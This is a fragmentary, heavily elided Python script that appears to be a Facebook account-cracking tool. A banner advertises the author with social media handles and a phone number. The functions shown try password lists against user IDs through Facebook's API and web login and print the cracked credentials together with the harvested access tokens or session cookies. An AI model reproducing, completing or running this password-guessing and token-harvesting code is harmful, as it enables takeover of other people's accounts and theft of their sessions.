...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 AjMaLo NaZiro🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [NaZiro XD   AjMaLo ║
...
\x1b[0;33m║#YOUTUBE : A J HACKER😐.  ║

\x1b[0;33m║#FACEBOOK : NAME [AjMaL sHaH   NaZir kHaN.  II ].       ║

\x1b[0;33m║#GITHUB : https://github.com/NaZIROKHANX460.   ║

\x1b[0;33m║#WHATSAPP : 03025669420.                   ║
...
def login():
	...
	try:
		...
		requests.get("0https://www.facebook.com/ajmal.shah41")
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mNaZir PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[TOOR-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	try:
		...
		ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[NAZIR-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[TOOR-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[TOOR-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[X-VIRUS-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[TOOR-CP] %s|%s\033[0;91m        "%(uid, pw))
...
def setting_ua():
	...
	if ua =="":
		...
		print("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
